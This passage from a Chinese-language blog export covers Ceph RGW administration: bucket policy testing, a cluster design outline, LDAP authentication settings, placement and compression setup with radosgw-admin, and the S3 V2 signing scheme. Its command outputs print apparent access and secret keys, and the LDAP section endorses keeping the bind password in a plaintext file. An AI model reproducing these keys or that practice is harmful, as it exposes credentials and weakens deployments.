class="built_in">print</span>(bkt.get_all_keys())</span><br></pre></td></tr></table></figure>
<p>执行下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python bkt-policy.py</span></span><br><span class="line">[&lt;Key: :my-cold-bucket,admin.cfg&gt;, &lt;Key: :my-cold-bucket,tgt.tar&gt;]</span><br><span class="line">[&lt;Key: ours:ouronebucket,ours_two.cfg&gt;]</span><br></pre></td></tr></table></figure>
<p>发现跨tenant可以正常访问。</p>
<p>修改<code>ouronebucket</code> policy 中的<code>Principal</code>为<code>&#123;&quot;AWS&quot;: [&quot;arn:aws:iam::ours:user/two&quot;,&quot;arn:aws:iam:::user/admin&quot;]&#125;,</code>只允许<code>ours$two</code>和<code>admin</code>这两个用户访问。<br>再次执行上面的python脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python bkt-policy.py</span></span><br><span class="line">[&lt;Key: :my-cold-bucket,admin.cfg&gt;, &lt;Key: :my-cold-bucket,tgt.tar&gt;]</span><br><span class="line">[&lt;Key: ours:ouronebucket,ours_two.cfg&gt;]</span><br></pre></td></tr></table></figure>
<p>再在上面的脚本中增加<code>colder</code>的access、secret key。并执行脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python bkt-policy.py</span></span><br><span class="line">[&lt;Key: :my-cold-bucket,admin.cfg&gt;, &lt;Key: :my-cold-bucket,tgt.tar&gt;]</span><br><span class="line">[&lt;Key: ours:ouronebucket,ours_two.cfg&gt;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;bkt-policy.py&quot;, line 22, in &lt;module&gt;</span><br><span class="line">    bkt = conn.get_bucket(bucket)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/boto/s3/connection.py&quot;, line 509, in get_bucket</span><br><span class="line">    return self.head_bucket(bucket_name, headers=headers)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/site-packages/boto/s3/connection.py&quot;, line 542, in head_bucket</span><br><span class="line">    raise err</span><br><span class="line">boto.exception.S3ResponseError: S3ResponseError: 403 Forbidden</span><br></pre></td></tr></table></figure>
<p>由于<code>Principal</code>中没有给<code>colder</code>用户授权，所以<code>colder</code>访问<code>ouronebucket</code>时报403错误。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/a1aab0d3eeef">ceph rgw：bucket policy实现</a></li>
<li><a href="https://www.dovefi.com/post/rgw-bucket-policy%E6%9D%83%E9%99%90%E8%AE%BE%E7%BD%AE/">Rgw bucket policy权限设置</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>RGW Cluster</title>
    <url>/2019/09/11/storage/ceph/rgw-cluster/</url>
    <content><![CDATA[<p>RGW &#x3D;&#x3D; Rados Gateway 中文名字叫对象存储网关。</p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul>
<li>一个RGW能承载的访问量是有限的，若出现故障或性能瓶颈怎么办？若是部署成多个，业务低谷时造成资源浪费</li>
<li>一个集群与单节点有何区别，若整个集群崩溃宕机是小，丢数据为大</li>
<li>客户端的访问协议千奇百怪若只支持S3不足以服众</li>
<li>单纯的V2认证安全性差</li>
<li>客户端压缩、加密数据代价太大，而且难以实现</li>
<li>所有用户、bucket在一个命名空间内安全性太差</li>
</ul>
<p>为解决上述问题，提出如下方案</p>
<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><p><img src="/images/ceph/RGWCluster.png" alt="rgwcluster.png"></p>
<ul>
<li>管理控制I&#x2F;O与数据读写I&#x2F;O分开处理<br>  管理控制I&#x2F;O负责设置获取RGW集群信息；<br>  数据读写I&#x2F;O负责上传下载对象或上传下载文件。</li>
<li>不同Ceph集群之间互为主备关系<br>  主集群采用副本集数据保护机制;<br>  备份集群采用EraseCode数据保护机制。</li>
<li>RGW实例由K8s对外发布并提供服务<br>  利用K8s的Autoscaling可以根据负载情况动态调整RGW实例数量；<br>  利用K8s的分布式LB可以有效的分散RGW上访问压力。</li>
</ul>
<h2 id="涉及到的模块"><a href="#涉及到的模块" class="headerlink" title="涉及到的模块"></a>涉及到的模块</h2><ul>
<li>RGW Cluster Manager</li>
<li>S3 API</li>
<li>NFS</li>
<li>Admin API</li>
<li>RGW</li>
</ul>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="资源管理功能"><a href="#资源管理功能" class="headerlink" title="资源管理功能"></a>资源管理功能</h2><h3 id="存储资源管理"><a href="#存储资源管理" class="headerlink" title="存储资源管理"></a>存储资源管理</h3><ul>
<li>存储资源分配<br>  按容量(初始容量)优先分配<br>  按性能优先分配</li>
<li>存储资源回收</li>
<li>存储资源使用情况查询<br>  可以为计费模块统计提供资源使用情况</li>
</ul>
<h3 id="用户及权限管理"><a href="#用户及权限管理" class="headerlink" title="用户及权限管理"></a>用户及权限管理</h3><ul>
<li>用户管理<br>  用户的增加、删除、属性修改</li>
<li>用户权限管理<br>  用户权限的授权、回收</li>
</ul>
<h3 id="配额管理"><a href="#配额管理" class="headerlink" title="配额管理"></a>配额管理</h3><ul>
<li>user 配额设置<br>  针对用户名下的对象数量、可使用容量(byte)进行配额设置</li>
<li>bucket 配额设置<br>  针对bucket下的对象数量、可使用容量(byte)进行配额设置</li>
</ul>
<h3 id="RGW节点网络控制管理"><a href="#RGW节点网络控制管理" class="headerlink" title="RGW节点网络控制管理"></a>RGW节点网络控制管理</h3><ul>
<li>访问RGW节点客户端黑、白名单机制</li>
<li>RGW节点接收请求的流量配额管理</li>
<li>RGW节点读写Ceph集群的流量配额管理</li>
</ul>
<h3 id="数据压缩、加密"><a href="#数据压缩、加密" class="headerlink" title="数据压缩、加密"></a>数据压缩、加密</h3><ul>
<li>RGW节点接收数据后在Server端完成对数据的压缩，压缩算法需要由用户或运维人员指定</li>
<li>RGW节点接收数据后在Server端完成对数据的加密，加密使用的密钥可人为指定</li>
</ul>
<h3 id="多种认证支持"><a href="#多种认证支持" class="headerlink" title="多种认证支持"></a>多种认证支持</h3><ul>
<li>MFA(Multi-Factor Authentication)认证</li>
<li>keystone认证</li>
<li>LDAP认证</li>
<li>V4认证</li>
</ul>
<h3 id="多租户管理"><a href="#多租户管理" class="headerlink" title="多租户管理"></a>多租户管理</h3><p>对多租户的支持可以允许不同的租户使用相同的用户名、bucket名。更友好的隔离数据，防止对用户和bucket的嗅探。</p>
<h2 id="接口功能"><a href="#接口功能" class="headerlink" title="接口功能"></a>接口功能</h2><p>支持Compatible-S3、Swift、NFS等多种接口。</p>
<h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p>支持将S3接口导出为NFS接口，方便符合POSIX标准的请求使用。</p>
<h2 id="故障切换"><a href="#故障切换" class="headerlink" title="故障切换"></a>故障切换</h2><h3 id="RGW故障"><a href="#RGW故障" class="headerlink" title="RGW故障"></a>RGW故障</h3><p>由于RGW采用分布式部署方式，单个RGW的故障不影响整体使用。RGW由K8s发布提供服务，即使出现性能不足或多点故障，也都由K8s调度恢复。</p>
<h3 id="Ceph集群故障"><a href="#Ceph集群故障" class="headerlink" title="Ceph集群故障"></a>Ceph集群故障</h3><p>由于集群之间采用主备方式存储数据，即使主集群停止服务，也可通过备集群继续提供服务。</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>RGW使用外部认证验证</title>
    <url>/2019/09/24/storage/ceph/rgw-auth-ldap/</url>
    <content><![CDATA[<p>RGW支持很多种认证AWS标准的V2、V4；还有开放的LDAP，MFA，keystone，barbican等。太多了就不一一列举了。</p>
<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>要想使用LDAP认证，首先你的有个LDAP Server。然后将RGW的LDAP开关打开，LDAP相关配置项配置好。重启RGW，你就可以使用LDAP认证了，简单不！</p>
<p>关于LDAP的搭建请见<code>参考&amp;鸣谢</code>中的<code>2</code>和<code>3</code>。</p>
<h2 id="RGW配置"><a href="#RGW配置" class="headerlink" title="RGW配置"></a>RGW配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">rgw_ldap_uri = ldap://10.100.13.111:389</span><br><span class="line">rgw_ldap_binddn = &quot;cn=Manager,dc=my-domain,dc=com&quot;</span><br><span class="line">rgw_ldap_secret = &quot;/etc/ceph/bindpass&quot;</span><br><span class="line">rgw_ldap_searchdn = &quot;dc=my-domain,dc=com&quot;</span><br><span class="line">rgw_ldap_dnattr = &quot;cn&quot;</span><br><span class="line">rgw_s3_auth_use_ldap = true</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>rgw_ldap_binddn<br>  RGW访问LDAP Server使用的账户名</li>
<li>rgw_ldap_secret<br>  访问LDAP Server账户名对应的密码，必须放到文件中，这里指定一个访问文件的路径（明文存储文件就行）</li>
<li>rgw_ldap_searchdn<br>  验证是检索的范围</li>
<li>rgw_ldap_dnattr<br>  构建检索filter的属性名，RGW在程序中会将需要验证的账户名与之组对儿 eg: <code>cn=ldapuser1</code></li>
</ul>
<p>其它别的参数就不用解释了，看不懂可以先测一下智商。</p>
<p><img src="/images/security/LDAP_Server.png" alt="LDAP_Server"></p>
<p>截止目前未知，我都依然没有搞清楚什么事 <code>cn</code>,<code>ou</code>,<code>dn</code>,<code>dc</code>。嗯～～～～一头雾水啊！不管了，LDAP相关的自己问度娘去吧。</p>
<h2 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h2><p>Todo…</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ol>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_ceph_storage/2/html/ceph_object_gateway_with_ldapad_guide/index">CEPH OBJECT GATEWAY WITH LDAP&#x2F;AD GUIDE</a></li>
<li><a href="https://www.linuxidc.com/Linux/2019-05/158733.htm">CentOS 7下安装部署OpenLDAP+phpLDAPadmin</a></li>
<li><a href="https://www.cnblogs.com/37Y37/p/9315945.html">LDAP落地实战（一）：OpenLDAP部署及管理维护</a></li>
</ol>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>radosgw</tag>
      </tags>
  </entry>
  <entry>
    <title>RGW zongroup/zone placement 和 compression 用法</title>
    <url>/2019/10/16/storage/ceph/rgw-placement-usage/</url>
    <content><![CDATA[<p>书接上文，上回书咱们了解了multisite的配置，最重要的是知道了zonegroup、zone是个什么东西，该怎么用。</p>
<p>那么今天我们来看看zonegroup和zone中的placement，顾名思义，用于告诉zone使用这个placement会将bucket、object要放到哪个里。</p>
<p>关于single rgw的模式，可以参考官网的<a href="https://docs.ceph.com/docs/mimic/radosgw/placement/">使用配置</a>，这里不做赘述了。下面介绍一下Multisite上的配置方法。</p>
<h2 id="Placement"><a href="#Placement" class="headerlink" title="Placement"></a>Placement</h2><ol>
<li>在master zone和非master zone上分别创建同名placement</li>
<li>使用的时候可以在用户信息中指定placement，也可以在创建bucket的s3请求中指定placement。</li>
</ol>
<h3 id="master-zone"><a href="#master-zone" class="headerlink" title="master zone"></a>master zone</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zonegroup placement add \</span></span><br><span class="line"><span class="language-bash">        --rgw-zonegroup default \</span></span><br><span class="line"><span class="language-bash">        --placement-id cold-placement</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zone placement add \</span></span><br><span class="line"><span class="language-bash">        --rgw-zone exter \</span></span><br><span class="line"><span class="language-bash">        --placement-id cold-placement \</span></span><br><span class="line"><span class="language-bash">        --data-pool exter.rgw.cold.data \</span></span><br><span class="line"><span class="language-bash">        --index-pool exter.rgw.cold.index \</span></span><br><span class="line"><span class="language-bash">        --data-extra-pool exter.rgw.cold.non-ec \</span></span><br><span class="line"><span class="language-bash">        --compression zlib</span></span><br></pre></td></tr></table></figure>

<p>看一下配置完的zone（此处忽略zonegroup配置完的接口）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zone get</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: &quot;69234f1d-8f48-4431-b45f-912087431a47&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;exter&quot;,</span><br><span class="line">    &quot;domain_root&quot;: &quot;exter.rgw.meta:root&quot;,</span><br><span class="line">    &quot;control_pool&quot;: &quot;exter.rgw.control&quot;,</span><br><span class="line">    &quot;gc_pool&quot;: &quot;exter.rgw.log:gc&quot;,</span><br><span class="line">    &quot;lc_pool&quot;: &quot;exter.rgw.log:lc&quot;,</span><br><span class="line">    &quot;log_pool&quot;: &quot;exter.rgw.log&quot;,</span><br><span class="line">    &quot;intent_log_pool&quot;: &quot;exter.rgw.log:intent&quot;,</span><br><span class="line">    &quot;usage_log_pool&quot;: &quot;exter.rgw.log:usage&quot;,</span><br><span class="line">    &quot;reshard_pool&quot;: &quot;exter.rgw.log:reshard&quot;,</span><br><span class="line">    &quot;user_keys_pool&quot;: &quot;exter.rgw.meta:users.keys&quot;,</span><br><span class="line">    &quot;user_email_pool&quot;: &quot;exter.rgw.meta:users.email&quot;,</span><br><span class="line">    &quot;user_swift_pool&quot;: &quot;exter.rgw.meta:users.swift&quot;,</span><br><span class="line">    &quot;user_uid_pool&quot;: &quot;exter.rgw.meta:users.uid&quot;,</span><br><span class="line">    &quot;otp_pool&quot;: &quot;exter.rgw.otp&quot;,</span><br><span class="line">    &quot;system_key&quot;: &#123;</span><br><span class="line">        &quot;access_key&quot;: &quot;85ZFW53VCKBZR7DQ7GS8&quot;,</span><br><span class="line">        &quot;secret_key&quot;: &quot;MfyuJECq3Et2kktmf3T077rYwXQMEiIGYRlwKBnq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;placement_pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;key&quot;: &quot;cold-placement&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;index_pool&quot;: &quot;exter.rgw.cold.index&quot;,</span><br><span class="line">                &quot;data_pool&quot;: &quot;exter.rgw.cold.data&quot;,</span><br><span class="line">                &quot;data_extra_pool&quot;: &quot;exter.rgw.cold.non-ec&quot;,</span><br><span class="line">                &quot;index_type&quot;: 0,</span><br><span class="line">                &quot;compression&quot;: &quot;zlib&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;key&quot;: &quot;default-placement&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;index_pool&quot;: &quot;exter.rgw.buckets.index&quot;,</span><br><span class="line">                &quot;data_pool&quot;: &quot;exter.rgw.buckets.data&quot;,</span><br><span class="line">                &quot;data_extra_pool&quot;: &quot;exter.rgw.buckets.non-ec&quot;,</span><br><span class="line">                &quot;index_type&quot;: 0,</span><br><span class="line">                &quot;compression&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;metadata_heap&quot;: &quot;&quot;,</span><br><span class="line">    &quot;realm_id&quot;: &quot;&quot;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>让上述配置生效需要<code>radosgw-admin period update --commit</code>一下。</p>
<h3 id="非master-zone"><a href="#非master-zone" class="headerlink" title="非master zone"></a>非master zone</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zonegroup placement add \</span></span><br><span class="line"><span class="language-bash">        --rgw-zonegroup default \</span></span><br><span class="line"><span class="language-bash">        --placement-id cold-placement</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zone placement add \</span></span><br><span class="line"><span class="language-bash">        --rgw-zone backup \</span></span><br><span class="line"><span class="language-bash">        --placement-id cold-placement \</span></span><br><span class="line"><span class="language-bash">        --data-pool backup.rgw.cold.data \</span></span><br><span class="line"><span class="language-bash">        --index-pool backup.rgw.cold.index \</span></span><br><span class="line"><span class="language-bash">        --data-extra-pool backup.rgw.cold.non-ec \</span></span><br><span class="line"><span class="language-bash">        --compression lz4</span></span><br></pre></td></tr></table></figure>
<p>*** 此处用的压缩算法与之前master zone使用的不一致，不影响使用。放心。***rgw会在每个对象上记录一个压缩类型，所以即使你这一刻使用的压缩算法和之前使用的不一致也不影响解压工作。</p>
<p>看一下配置完的zone（此处忽略zonegroup配置完的接口）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin zone get</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;id&quot;: &quot;a6621518-6f80-41f5-a736-fb5d1814e036&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;backup&quot;,</span><br><span class="line">    &quot;domain_root&quot;: &quot;backup.rgw.meta:root&quot;,</span><br><span class="line">    &quot;control_pool&quot;: &quot;backup.rgw.control&quot;,</span><br><span class="line">    &quot;gc_pool&quot;: &quot;backup.rgw.log:gc&quot;,</span><br><span class="line">    &quot;lc_pool&quot;: &quot;backup.rgw.log:lc&quot;,</span><br><span class="line">    &quot;log_pool&quot;: &quot;backup.rgw.log&quot;,</span><br><span class="line">    &quot;intent_log_pool&quot;: &quot;backup.rgw.log:intent&quot;,</span><br><span class="line">    &quot;usage_log_pool&quot;: &quot;backup.rgw.log:usage&quot;,</span><br><span class="line">    &quot;reshard_pool&quot;: &quot;backup.rgw.log:reshard&quot;,</span><br><span class="line">    &quot;user_keys_pool&quot;: &quot;backup.rgw.meta:users.keys&quot;,</span><br><span class="line">    &quot;user_email_pool&quot;: &quot;backup.rgw.meta:users.email&quot;,</span><br><span class="line">    &quot;user_swift_pool&quot;: &quot;backup.rgw.meta:users.swift&quot;,</span><br><span class="line">    &quot;user_uid_pool&quot;: &quot;backup.rgw.meta:users.uid&quot;,</span><br><span class="line">    &quot;otp_pool&quot;: &quot;backup.rgw.otp&quot;,</span><br><span class="line">    &quot;system_key&quot;: &#123;</span><br><span class="line">        &quot;access_key&quot;: &quot;85ZFW53VCKBZR7DQ7GS8&quot;,</span><br><span class="line">        &quot;secret_key&quot;: &quot;MfyuJECq3Et2kktmf3T077rYwXQMEiIGYRlwKBnq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;placement_pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;key&quot;: &quot;cold-placement&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;index_pool&quot;: &quot;backup.rgw.cold.index&quot;,</span><br><span class="line">                &quot;data_pool&quot;: &quot;backup.rgw.cold.data&quot;,</span><br><span class="line">                &quot;data_extra_pool&quot;: &quot;backkup.rgw.cold.non-ec&quot;,</span><br><span class="line">                &quot;index_type&quot;: 0,</span><br><span class="line">                &quot;compression&quot;: &quot;lz4&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;key&quot;: &quot;default-placement&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;index_pool&quot;: &quot;backup.rgw.buckets.index&quot;,</span><br><span class="line">                &quot;data_pool&quot;: &quot;backup.rgw.buckets.data&quot;,</span><br><span class="line">                &quot;data_extra_pool&quot;: &quot;backup.rgw.buckets.non-ec&quot;,</span><br><span class="line">                &quot;index_type&quot;: 0,</span><br><span class="line">                &quot;compression&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;metadata_heap&quot;: &quot;&quot;,</span><br><span class="line">    &quot;realm_id&quot;: &quot;f334e6c2-c2b4-4c04-b541-f64d96c10c07&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样为了上诉修改生效也需要执行一下<code>radosgw-admin period update --commit</code></p>
<h2 id="User中使用Placement"><a href="#User中使用Placement" class="headerlink" title="User中使用Placement"></a>User中使用Placement</h2><p>要想在User中配置Placement，首先得创建一个User。由于我们是在Multisite模式中创建的User，所以创建的动作必须在master zone上操作，如果在非master zone上操作用户不能同步到master zone上。具体原因请见<a href="https://zhoubofsy.github.io/2019/10/14/storage/ceph/multi-site-in-a-cluster-md/">Deploy multisite in 同一个集群</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin user create --uid colder --display-name colder</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin user info --uid colder</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;user_id&quot;: &quot;colder&quot;,</span><br><span class="line">    &quot;display_name&quot;: &quot;colder&quot;,</span><br><span class="line">    &quot;email&quot;: &quot;&quot;,</span><br><span class="line">    &quot;suspended&quot;: 0,</span><br><span class="line">    &quot;max_buckets&quot;: 1000,</span><br><span class="line">    &quot;auid&quot;: 0,</span><br><span class="line">    &quot;subusers&quot;: [],</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;user&quot;: &quot;colder&quot;,</span><br><span class="line">            &quot;access_key&quot;: &quot;WGCQOD46GA92J7CIGXIY&quot;,</span><br><span class="line">            &quot;secret_key&quot;: &quot;8yZw0FkYojiLdebWEF61HHTGhUvBrCel6ZzvGQRu&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;swift_keys&quot;: [],</span><br><span class="line">    &quot;caps&quot;: [],</span><br><span class="line">    &quot;op_mask&quot;: &quot;read, write, delete&quot;,</span><br><span class="line">    &quot;default_placement&quot;: &quot;&quot;,</span><br><span class="line">    &quot;placement_tags&quot;: [],</span><br><span class="line">    &quot;bucket_quota&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: false,</span><br><span class="line">        &quot;check_on_raw&quot;: false,</span><br><span class="line">        &quot;max_size&quot;: -1,</span><br><span class="line">        &quot;max_size_kb&quot;: 0,</span><br><span class="line">        &quot;max_objects&quot;: -1</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;user_quota&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: false,</span><br><span class="line">        &quot;check_on_raw&quot;: false,</span><br><span class="line">        &quot;max_size&quot;: -1,</span><br><span class="line">        &quot;max_size_kb&quot;: 0,</span><br><span class="line">        &quot;max_objects&quot;: -1</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;temp_url_keys&quot;: [],</span><br><span class="line">    &quot;type&quot;: &quot;rgw&quot;,</span><br><span class="line">    &quot;mfa_ids&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>default_placement</code>为空，此时会使用默认的placement也就是<code>default-placement</code>。所以需要配置这个选项。但是<code>radosgw-admin</code>中没有直接配置这个项目的参数，所以需要采用导出导入metadata的方式来修改该项目。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin metadata get user:colder &gt; colder.json</span></span><br></pre></td></tr></table></figure>
<p>将user <code>colder</code>的配置导出到<code>coder.json</code>中，然后编辑其中的<code>&quot;default_placement&quot;: &quot;cold-placement&quot;,</code>，然后再将<code>colder.json</code>导入回去。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">radosgw-admin metadata put user:colder &lt; colder.json</span></span><br></pre></td></tr></table></figure>
<p>接下来可以使用该用户的access-key和secret-key去创建bucket并上传对象了。</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>s3 authorization v2</title>
    <url>/2019/08/04/storage/ceph/s3-authorization-v2/</url>
    <content><![CDATA[<p>s3 authorization v2</p>
<h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><h3 id="通过Authorization请求头"><a href="#通过Authorization请求头" class="headerlink" title="通过Authorization请求头"></a>通过<code>Authorization</code>请求头</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>AWS AWSAccessKeyId:Signature</span><br></pre></td></tr></table></figure>

<ul>
<li><code>AWSAccessKeyId</code>: 你的<code>AccessKey</code></li>
<li><code>Signature</code>: 计算得到的签名</li>
</ul>
<p>eg:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>AWS ziw5dp1alvty9n47qksu:frJIUN8DYpKDtOLCwo//yllqDzg=</span><br></pre></td></tr></table></figure>

<h3 id="通过请求参数"><a href="#通过请求参数" class="headerlink" title="通过请求参数"></a>通过请求参数</h3><p>HTTP请求中的参数：</p>
<ul>
<li><code>AWSAccessKeyId</code>: 你的<code>AccessKey</code></li>
<li><code>Signature</code>: 计算得到的签名</li>
<li><code>Expires</code>: 签名的过期时间</li>
</ul>
<p>eg:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /yourbucket/yourkey?AWSAccessKeyId=ziw5dp1alvty9n47qksu&amp;Expires=1141889120&amp;Signature=vjbyPxybdZaNmGa%2ByT272YEAiv4%3D</span><br></pre></td></tr></table></figure>

<h2 id="签名计算"><a href="#签名计算" class="headerlink" title="签名计算"></a>签名计算</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Signature = Base64(HMAC-SHA1(YourSecretKey, UTF-<span class="number">8</span>-Encoding-Of(StringToSign)))</span><br></pre></td></tr></table></figure>

<ul>
<li>YourSecretKey: 你的<code>SecretKey</code></li>
<li>StringToSign</li>
</ul>
<h3 id="StringToSign"><a href="#StringToSign" class="headerlink" title="StringToSign"></a>StringToSign</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringToSign =  HTTP-Verb + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                Content-MD5 + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                Content-Type + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                Date|Expires + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                CanonicalizedAmzHeaders +</span><br><span class="line">                CanonicalizedResource</span><br></pre></td></tr></table></figure>

<ul>
<li>HTTP-Verb: 请求的方法，如：<code>PUT</code>，<code>GET</code>，<code>DELETE</code>，<code>POST</code> </li>
<li>Content-MD5: 请求头Content-MD5的内容，如果没有这个头，由空字符串代替</li>
<li>Content-Type: 请求头Content-Type的内容，如果没有这个头，由空字符串代替</li>
<li>Date|Expires: 如果使用Authorization头携带签名信息，为Date头的内容，如果没有Date头，由空字符串代替；如果使用请求参数携带签名信息，为参数Expires的内容</li>
<li>CanonicalizedAmzHeaders: 请求中所有以x-amz-开始的头所组成的字符串,如果没有这样的头，由空字符串代替<br>  eg:  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">原始请求头：</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 27 Mar 2007 19:36:42 +0000</span><br><span class="line"><span class="attribute">X-Amz-b</span><span class="punctuation">: </span>  Bar</span><br><span class="line"><span class="attribute">x-amz-a</span><span class="punctuation">: </span>foob</span><br><span class="line"><span class="attribute">x-Amz-a</span><span class="punctuation">: </span>  fooa</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>johnsmith.s3.amazonaws.com</span><br><span class="line"></span><br><span class="line">对应的CanonicalizedAmzHeaders为：</span><br><span class="line">x-amz-a:fooa,foob</span><br><span class="line">x-amz-b:Bar</span><br></pre></td></tr></table></figure></li>
<li>CanonicalizedResource: 请求所对应的资源<br>  eg:  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?foo=bar</span><br><span class="line">GET /yourbucket/yourkey?foo=bar</span><br><span class="line">GET /yourbucket/yourkey?acl&amp;foo=bar</span><br><span class="line"></span><br><span class="line">对应的nicalizedResource分别为：</span><br><span class="line"></span><br><span class="line">／</span><br><span class="line">/yourbucket/yourkey</span><br><span class="line">/yourbucket/yourkey?acl</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://doc.bscstorage.com/doc/s2/signature/signature.html">签名算法</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>s3 authorization v4</title>
    <url>/2019/08/04/storage/ceph/s3-authorization-v4/</url>
    <content><![CDATA[<p>s3 authorization v4</p>
<h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><h3 id="通过Authorization请求头"><a href="#通过Authorization请求头" class="headerlink" title="通过Authorization请求头"></a>通过<code>Authorization</code>请求头</h3><p>eg:</p>
